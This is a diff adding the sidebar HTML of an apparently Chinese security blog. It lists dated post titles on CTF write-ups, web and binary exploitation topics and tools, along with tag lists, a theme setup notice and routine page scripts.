+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href="/posts/18428/">lamp && lnmp以apt-get的方式安装</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/04</span><a class="archive-post-title" href="/posts/7418/">websec.fr-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href="/posts/42614/">TokyoWesterns CTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href="/posts/12920/">awd准备工作</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/03</span><a class="archive-post-title" href="/posts/39475/">ctfzone-ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href="/posts/13474/">real-world-ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href="/posts/6549/">ISITDTU-CTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href="/posts/46785/">巅峰极客ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href="/posts/5109/">php-命令执行</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href="/posts/62555/">RSA学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href="/posts/28940/">ssti</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/15</span><a class="archive-post-title" href="/posts/45992/">php命令执行函数</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/09</span><a class="archive-post-title" href="/posts/63527/">ollyice</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/16486/">web安全备忘录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/26</span><a class="archive-post-title" href="/posts/22546/">googlectf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/24</span><a class="archive-post-title" href="/posts/9490/">linux常见文件的作用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/21</span><a class="archive-post-title" href="/posts/32268/">sctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/14</span><a class="archive-post-title" href="/posts/54865/">python多线程和lock和Rlock</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/54897/">linux格式化字符串漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn备忘录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/04</span><a class="archive-post-title" href="/posts/50844/">linux命令执行</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/04</span><a class="archive-post-title" href="/posts/51203/">LRE_PAYLOAD绕过open_basedir</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/17498/">mysql忘记密码/修改密码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/28</span><a class="archive-post-title" href="/posts/26365/">suctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/posts/32791/">bypassaslr_return2plt</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/08</span><a class="archive-post-title" href="/posts/62655/">cbc翻转</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/07</span><a class="archive-post-title" href="/posts/60875/">misc思路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href="/posts/33488/">简单的命令（shell+python）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href="/posts/15636/">parse_url + curl</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span><a class="archive-post-title" href="/posts/22230/">ddctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/18</span><a class="archive-post-title" href="/posts/65402/">PHP代码审计归纳</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span><a class="archive-post-title" href="/posts/52452/">xss</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span><a class="archive-post-title" href="/posts/24854/">url相对路径和绝对路径</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/26</span><a class="archive-post-title" href="/posts/40688/">python3和python2 base64的问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href="/posts/41083/">sql注入大全</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf_php_debug"><span class="iconfont-archer">&#xe606;</span>ctf_php_debug</span>
+    
+        <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
+    
+        <span class="sidebar-tag-name" data-tags="置顶"><span class="iconfont-archer">&#xe606;</span>置顶</span>
+    
+        <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
+    
+        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
+    
+        <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
+    
+        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
+    
+        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="python安全"><span class="iconfont-archer">&#xe606;</span>python安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
+    
+        <span class="sidebar-tag-name" data-tags="安全体系建设"><span class="iconfont-archer">&#xe606;</span>安全体系建设</span>
+    
+        <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="安全"><span class="iconfont-archer">&#xe60a;</span>安全</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Tianji"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
